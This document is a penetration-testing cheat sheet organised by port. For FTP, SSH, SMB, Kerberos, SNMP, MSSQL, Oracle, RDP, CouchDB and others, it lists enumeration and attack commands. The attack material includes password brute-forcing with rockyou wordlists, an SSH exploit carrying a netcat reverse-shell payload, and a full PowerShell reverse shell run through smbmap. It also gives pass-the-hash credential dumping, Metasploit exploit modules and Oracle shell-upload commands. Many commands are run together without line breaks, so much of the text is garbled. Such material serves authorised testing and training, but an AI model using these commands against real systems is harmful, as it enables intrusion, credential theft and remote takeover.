# Ports

## General <a id="general"></a>

AIO [Penetration Testing Methodology - 0DAYsecurity.com](http://0daysecurity.com/penetration-testing/enumeration.html)​

## Port 21 - FTP <a id="port-21-ftp"></a>

```text
nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 10.11.1.111
```

## Port 22 - SSH <a id="port-22-ssh"></a>

* If you have usernames test login with username:username
* Vulnerable Versions to user enum: &lt;7.7

```text
nmap 10.11.1.1 -p22 -sVnc 10.11.1.1 22nmap -p22 10.11.1.1 --script ssh2-enum-algosnmap-p22 10.2.1.1 --script ssh-hostkey --script-args ssh_hostkey=fullnmap -p22 10.11.1.1 --script ssh-auth-methods --script-args="ssh.user=admin"​...Password:debug1: Authentication succeeded (keyboard-interactive).Authenticated to 10.10.1.111 ([10.10.1.1114]:22).debug1: channel 0: new [client-session]debug1: Entering interactive session.debug1: pledge: networkdebug1: client_input_global_request: rtype [email protected] want_reply 0debug1: Sending command: iddebug1: client_input_channel_req: channel 0 rtype exit-status reply 0debug1: client_input_channel_req: channel 0 rtype [email protected] reply 0uid=1000(user) gid=100(users) groups=100(users)debug1: channel 0: free: client-session, nchannels 1Transferred: sent 2412, received 2480 bytes, in 0.1 secondsBytes per second: sent 43133.4, received 44349.5debug1: Exit status 0​$ ssh -v 10.10.1.111OpenSSH_8.1p1, OpenSSL 1.1.1d  10 Sep 2019...debug1: Authentications that can continue: publickey,password,keyboard-interactive​$ ssh -v 10.10.1.111 -o PreferredAuthentications=password...debug1: Next authentication method: password​patator ssh_login host=10.11.1.111 port=22 user=root 0=/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt password=FILE0 -x ignore:mesg='Authentication failed.'hydra -l user -P /usr/share/wordlists/password/rockyou.txt -e s ssh://10.10.1.111medusa -h 10.10.1.111 -u user -P /usr/share/wordlists/password/rockyou.txt -e s -M sshncrack --user user -P /usr/share/wordlists/password/rockyou.txt ssh://10.10.1.111​python /usr/share/exploitdb/exploits/linux/remote/46307.py 10.10.1.111 22 idpython /usr/share/exploitdb/exploits/linux/remote/46307.py 10.10.1.111 22 "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.1.111 80 >/tmp/f"​​./sshfuzz.pl -H 10.10.1.111 -P 22 -u user -p user​use auxiliary/fuzzers/ssh/ssh_version_2​​python ssh_user_enum.py --port 2223 --userList /root/Downloads/users.txt IP 2>/dev/null | grep "is a"​https://shhgit.darkport.co.uk/
```

## Port 23 - Telnet <a id="port-23-telnet"></a>

```text
telnet 10.11.1.110patator telnet_login host=10.11.1.110 inputs='FILE0\nFILE1' 0=/root/Desktop/user.txt 1=/root/Desktop/pass.txt  persistent=0 prompt_re='Username: | Password:'
```

## Port 25 - SMTP <a id="port-25-smtp"></a>

```text
nc -nvv 10.11.1.111 25HELO foo​telnet 10.11.1.111 25VRFY root​nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 10.11.1.111smtp-user-enum -M VRFY -U /root/sectools/SecLists/Usernames/Names/names.txt -t 10.11.1.111​​DATAtest​.​Receive:250 OK
```

## Port 53 - DNS <a id="port-53-dns"></a>

```text
​dig AXFR domain.com @10.10.10.10dnsrecon -t axfr -d domainfierce -dns domain.com
```

## Port 69 - UDP - TFTP <a id="port-69-udp-tftp"></a>

* Vulns tftp in server 1.3, 1.4, 1.9, 2.1, and a few more.
* Same checks as FTP Port 21.

```text
nmap -p69 --script=tftp-enum.nse 10.11.1.111
```

## Port 88 - Kerberos <a id="port-88-kerberos"></a>

Check [Kerberos dedicated](https://six2dez.gitbook.io/pentest-book/post-exploitation/windows/ad/kerberos-attacks) section

```text
nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN.LOCAL'" IPuse auxiliary/gather/kerberos_enumusers ​GetNPUsers.py DOMAIN-Target/ -usersfile user.txt -dc-ip <IP> -format hashcat/john​ASREPRoast:impacket-GetUserSPNs <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>impacket-GetUserSPNs <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>​impacket-GetUserSPNs <domain_name>/<domain_user>:<domain_user_password> -outputfile <output_TGSs_file> ​python3 getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>python3 getTGT.py <domain_name>/<user_name> -aesKey <aes_key>python3 getTGT.py <domain_name>/<user_name>:[password]​​python3 psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-passpython3 smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-passpython3 wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass​​python kerbrute.py -dc-ip IP -users /root/htb/kb_users.txt -passwords /root/pass_common_plus.txt -threads 20 -domain DOMAIN -outputfile kb_extracted_passwords.txt​
```

## Port 110 - Pop3 <a id="port-110-pop3"></a>

```text
telnet 10.11.1.111PASS admin​​USER pellePASS admin​list​retr 9
```

## Port 111 - Rpcbind <a id="port-111-rpcbind"></a>

```text
rpcinfo -p 10.11.1.111rpcclient -U "" 10.11.1.111    srvinfo    enumdomusers    getdompwinfo    querydominfo    netshareenum    netshareenumall
```

## Port 135 - MSRPC <a id="port-135-msrpc"></a>

Some versions are vulnerable.

```text
nmap 10.11.1.111 --script=msrpc-enummsf > use exploit/windows/dcerpc/ms03_026_dcom
```

## Port 139/445 - SMB <a id="port-139-445-smb"></a>

```text
enum4linux -n 10.11.1.111nmblookup -A 10.11.1.111nmap --script=smb-enum* --script-args=unsafe=1 -T5 10.11.1.111​smbver.sh 10.11.1.111Msfconsole;use scanner/smb/smb_versionngrep -i -d tap0 's.?a.?m.?b.?a.*[[:digit:]]' smbclient -L \\\\10.11.1.111​smbmap -H  10.11.1.111 -R echo exit | smbclient -L \\\\10.11.1.111smbclient \\\\10.11.1.111\\smbclient -L //10.11.1.111 -Nnmap --script smb-enum-shares -p139,445 -T4 -Pn 10.11.1.111smbclient -L \\\\10.11.1.111\\smbclient -L //10.11.1.111/ --option='client min protocol=NT1'​smbmap -H 10.11.1.111rpcclient -U "" -N 10.11.1.111smbclient //10.11.1.111/IPC$ -N​enum -s 10.11.1.111enum -U 10.11.1.111enum -P 10.11.1.111enum4linux -a 10.11.1.111enum4linux-ng.py 10.11.1.111 -A -C/usr/share/doc/python3-impacket/examples/samrdump.py 10.11.1.111​smbclient //10.11.1.111/share -U username​smbclient \\\\10.11.1.111\\smbclient //10.11.1.111/smbclient //10.11.1.111/smbclient //10.11.1.111/<""share name"">rpcclient -U " " 10.11.1.111rpcclient -U " " -N 10.11.1.111​nmap --script smb-vuln* -p139,445 -T4 -Pn 10.11.1.111​msfconsole -r /usr/share/metasploit-framwork/scripts/resource/smb_checks.rc​msfconsole -r /usr/share/metasploit-framwork/scripts/resource/smb_validate.rc​msfconsole; use exploit/multi/samba/usermap_script; set lhost 192.168.0.X; set rhost 10.11.1.111; run​medusa -h 10.11.1.111 -u userhere -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -M smbnt nmap -p445 --script smb-brute --script-args userdb=userfilehere,passdb=/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt 10.11.1.111  -vvvvnmap –script smb-brute 10.11.1.111​nmap --script smb-enum-*,smb-vuln-*,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-protocols -p 139,445 10.11.1.111nmap --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse -p 139,445 10.11.1.111​mount -t cifs -o username=user,password=password //x.x.x.x/share /mnt/share​rpcclient -U "" 10.11.1.111    srvinfo    enumdomusers    getdompwinfo    querydominfo    netshareenum    netshareenumall​winexe -U username //10.11.1.111 "cmd.exe" --system​smbmap.py -H 10.11.1.111 -u administrator -p asdf1234 smbmap.py -u username -p '[email protected]$$w0rd1234!' -d DOMAINNAME -x 'net group "Domain Admins" /domain' -H 10.11.1.111 smbmap.py -H 10.11.1.111 -u username -p '[email protected]$$w0rd1234!' -L smbmap.py -u username -p '[email protected]$$w0rd1234!' -d ABC -H 10.11.1.111 -x 'powershell -command "function ReverseShellClean {if ($c.Connected -eq $true) {$c.Close()}; if ($p.ExitCode -ne $null) {$p.Close()}; exit; };$a=""""192.168.0.X""""; $port=""""4445"""";$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize  ;$p=New-Object System.Diagnostics.Process  ;$p.StartInfo.FileName=""""cmd.exe""""  ;$p.StartInfo.RedirectStandardInput=1  ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0  ;$p.Start()  ;$is=$p.StandardInput  ;$os=$p.StandardOutput  ;Start-Sleep 1  ;$e=new-object System.Text.AsciiEncoding  ;while($os.Peek() -ne -1){$out += $e.GetString($os.Read())} $s.Write($e.GetBytes($out),0,$out.Length)  ;$out=$null;$done=$false;while (-not $done) {if ($c.Connected -ne $true) {cleanup} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) { $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {break}}  if ($pos -gt 0){ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {ReverseShellClean} else {  $out=$e.GetString($os.Read());while($os.Peek() -ne -1){ $out += $e.GetString($os.Read());if ($out -eq $string) {$out="""" """"}}  $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}} else {ReverseShellClean}};"' ​\Policies\{REG}\MACHINE\Preferences\Groups\Groups.xml look for user&pass "gpp-decrypt "​crackmapexec smb 10.55.100.0/23 -u LA-ITAdmin -H 573f6308519b3df23d9ae2137f549b15 --localcrackmapexec smb 10.55.100.0/23 -u LA-ITAdmin -H 573f6308519b3df23d9ae2137f549b15 --local --lsa​python3 samdump.py SMB 172.21.0.0​python3 RunFinger.py -i 172.21.0.0/24
```

## Port 161/162 UDP - SNMP <a id="port-161-162-udp-snmp"></a>

```text
nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes 10.11.1.111nmap 10.11.1.111 -Pn -sU -p 161 --script=snmp-brute,snmp-hh3c-logins,snmp-info,snmp-interfaces,snmp-ios-config,snmp-netstat,snmp-processes,snmp-sysdescr,snmp-win32-services,snmp-win32-shares,snmp-win32-software,snmp-win32-userssnmp-check 10.11.1.111 -c public|private|communitysnmpwalk -c public -v1 ipaddress 1snmpwalk -c private -v1 ipaddress 1snmpwalk -c manager -v1 ipaddress 1onesixtyone -c /usr/share/doc/onesixtyone/dict.txt 172.21.0.X​python3 samdump.py SNMP 172.21.0.0 ​ auxiliary/scanner/misc/oki_scanner                                     auxiliary/scanner/snmp/aix_version                                    auxiliary/scanner/snmp/arris_dg950                                    auxiliary/scanner/snmp/brocade_enumhash                                auxiliary/scanner/snmp/cisco_config_tftp                                auxiliary/scanner/snmp/cisco_upload_file                               auxiliary/scanner/snmp/cnpilot_r_snmp_loot                              auxiliary/scanner/snmp/epmp1000_snmp_loot                              auxiliary/scanner/snmp/netopia_enum                                     auxiliary/scanner/snmp/sbg6580_enum                                  auxiliary/scanner/snmp/snmp_enum                                  auxiliary/scanner/snmp/snmp_enum_hp_laserjet                            auxiliary/scanner/snmp/snmp_enumshares                                 auxiliary/scanner/snmp/snmp_enumusers                                  auxiliary/scanner/snmp/snmp_login
```

## Port 389,636 - LDAP <a id="port-389-636-ldap"></a>

```text
jxplorerldapsearch -h 10.11.1.111 -p 389 -x -b "dc=mywebsite,dc=com"python3 windapsearch.py --dc-ip 10.10.10.182 --users --full > windapsearch_users.txtcat windapsearch_users.txt | grep sAMAccountName | cut -d " " -f 2 > users.txt
```

## Port 443 - HTTPS <a id="port-443-https"></a>

Read the actual SSL CERT to:

* find out potential correct vhost to GET
* is the clock skewed
* any names that could be usernames for bruteforce/guessing.

```text
./testssl.sh -e -E -f -p  -S -P -c -H -U TARGET-HOST > OUTPUT-FILE.html
```

## Port 500 - ISAKMP IKE <a id="port-500-isakmp-ike"></a>

## Port 513 - Rlogin <a id="port-513-rlogin"></a>

```text
apt install rsh-clientrlogin -l root 10.11.1.111
```

## Port 541 - FortiNet SSLVPN <a id="port-541-fortinet-sslvpn"></a>

​[Fortinet Ports Guide](https://help.fortinet.com/fos50hlp/54/Content/FortiOS/fortigate-ports-and-protocols-54/Images/FortiGate.png)​

​[SSL VPN Leak](https://opensecurity.global/forums/topic/181-fortinet-ssl-vpn-vulnerability-from-may-2019-being-exploited-in-wild/?__cf_chl_jschl_tk__=42e37b31a0585f7dae3dbce18cafde7c39b81976-1578385705-0-AcuYzrPMO1OuMo59JSPYyzZjiXNbMAIl6sKiXwhQRbMUMZq1Kp3VmWqIVXWZdzTZgFCecXue1Z6xXxU-Rql_GT_ovKiar_-i0CUCKFS85bfNXnUzuOuIwomXje-kH87mNbVHzzh9ediRfVWbJjwtO-ttLEYi7quczLlHQk38UqcumrARs77RrK2mj9zOb8Uwhv6av4QZ9od4fgAIl-F4Kff26MPQjs4LRHsgk5zH6RVwFMP8NdOnCrrzkkGH6_R9Dtw89_QtiOsH1nKB0hBDbtJ2O9AkkMDqw7tl1ip_pVDfnw1lvaZtFq1sRqgYwpan-n6n9f58Xdjcj2UGFKdE32OS7Ete8X7RwXUV9FGUSOhAM5_iK0kMNJg3mskrFVQz0lONaZVvFRdf_1rp69J4oRVat1m7KIQEGpRDe4OvYUb7pfQkNKLcK5s_lVIj2SAJQQ)​

## Port 1433 - MSSQL <a id="port-1433-mssql"></a>

```text
nmap -p 1433 -sU --script=ms-sql-info.nse 10.11.1.111use auxiliary/scanner/mssql/mssql_pinguse auxiliary/scanner/mssql/mssql_loginuse exploit/windows/mssql/mssql_payloadsqsh -S 10.11.1.111 -U sa    xp_cmdshell 'date'      go​​EXEC sp_execute_external_script @language = N'Python', @script = N'import os;os.system("whoami")'​https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/
```

## Port 1521 - Oracle <a id="port-1521-oracle"></a>

```text
oscanner -s 10.11.1.111 -P 1521tnscmd10g version -h 10.11.1.111tnscmd10g status -h 10.11.1.111nmap -p 1521 -A 10.11.1.111nmap -p 1521 --script=oracle-tns-version,oracle-sid-brute,oracle-bruteMSF: good modules under auxiliary/admin/oracle and scanner/oracle​./odat-libc2.5-i686 all -s 10.11.1.111 -p 1521./odat-libc2.5-i686 sidguesser -s 10.11.1.111 -p 1521./odat-libc2.5-i686 passwordguesser -s 10.11.1.111 -p 1521 -d XE​./odat-libc2.5-i686 utlfile -s 10.11.1.111 -p 1521 -U scott -P tiger -d XE --sysdba --putFile c:/ shell.exe /root/shell.exe​./odat-libc2.5-i686 externaltable -s 10.11.1.111 -p 1521 -U scott -P tiger -d XE --sysdba --exec c:/ shell.exe
```

## Port 2000 - Cisco sccp <a id="port-2000-cisco-sccp"></a>

```text
CAT -h ip -p 2000 -w /usr/share/wordlists/rockyou.txt ​https://github.com/Sab0tag3d/SIET/sudo python siet.py -g -i 192.168.0.1
```

## Port 2049 - NFS <a id="port-2049-nfs"></a>

```text
nmap -p 111,2049 --script nfs-ls,nfs-showmount​showmount -e 10.11.1.111​​mount 10.11.1.111:/ /tmp/NFSmount -t nfs 10.11.1.111:/ /tmp/NFS
```

## Port 2100 - Oracle XML DB <a id="port-2100-oracle-xml-db"></a>

Default passwords:

​[https://docs.oracle.com/cd/B10501\_01/win.920/a95490/username.htm](https://docs.oracle.com/cd/B10501_01/win.920/a95490/username.htm)​

## Port 3306 - MySQL <a id="port-3306-mysql"></a>

```text
nmap --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse 10.11.1.111 -p 3306​mysql --host=10.11.1.111 -u root -p​https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/
```

## Port 3389 - RDP <a id="port-3389-rdp"></a>

```text
nmap -p 3389 --script=rdp-vuln-ms12-020.nserdesktop -u username -p password -g 85% -r disk:share=/root/ 10.11.1.111rdesktop -u guest -p guest 10.11.1.111 -g 94%ncrack -vv --user Administrator -P /root/oscp/passwords.txt rdp://10.11.1.111python crowbar.py -b rdp -s 10.11.1.111/32 -u admin -C ../rockyou.txt -v
```

## Port 5432 - PostgreSQL <a id="port-5432-postgresql"></a>

```text
psql -h 10.10.1.111 -U postgres -W​postgres : postgrespostgres : passwordpostgres : adminadmin : adminadmin : password​pg_dump --host=10.10.1.111 --username=postgres --password --dbname=template1 --table='users' -f output_pgdump
```

## Port 5900 - VNC <a id="port-5900-vnc"></a>

```text
nmap --script=vnc-info,vnc-brute,vnc-title -p 5900 10.11.1.111
```

## Port 5984 - CouchDB <a id="port-5984-couchdb"></a>

```text
curl http://example.com:5984/curl -X GET http://IP:5984/_all_dbs​​curl -X PUT ‘http://localhost:5984/_users/org.couchdb.user:chenny' — data-binary ‘{ “type”: “user”, “name”: “chenny”, “roles”: [“_admin”], “roles”: [], “password”: “password” }’​curl http://127.0.0.1:5984/passwords/_all_docs?include_docs=true -u chenny:-Xpassword <ds/_all_docs?include_docs=true -u chenny:-Xpassword​
```

## Port 5985 - WinRM <a id="port-5985-winrm"></a>

```text
gem install evil-winrmevil-winrm -i 10.11.1.111 -u Administrator -p 'password1'evil-winrm -i 10.11.1.111 -u Administrator -H 'hash-pass' -s /scripts/folder
```

## Port 6379 - Redis <a id="port-6379-redis"></a>

```text
python redis.py 10.10.10.160 redis
```

## Port 8172 - MsDeploy <a id="port-8172-msdeploy"></a>

## Port 27017-19/27080/28017 - MongoDB <a id="port-27017-19-27080-28017-mongodb"></a>

​[MongoDB](https://six2dez.gitbook.io/pentest-book/enumeration/webservices/nosql-and-and-mongodb)​

## Unknown ports <a id="unknown-ports"></a>

* `amap -d 10.11.1.111 8000`
* netcat: makes connections to ports. Can echo strings or give shells: `nc -nv 10.11.1.111 110`
* sfuzz: can connect to ports, udp or tcp, refrain from closing a connection, using basic HTTP configurations

## RCE ports <a id="rce-ports"></a>

![](https://gblobscdn.gitbook.com/assets%2F-M5x1LJiRQvXWpt04_ee%2F-MLGrmoT-h9HJFisWAcF%2F-MLGsLNQURVNPdeBP_yr%2Fimage.png?alt=media&token=8149a413-e54b-4096-8a67-66085216c5e5)

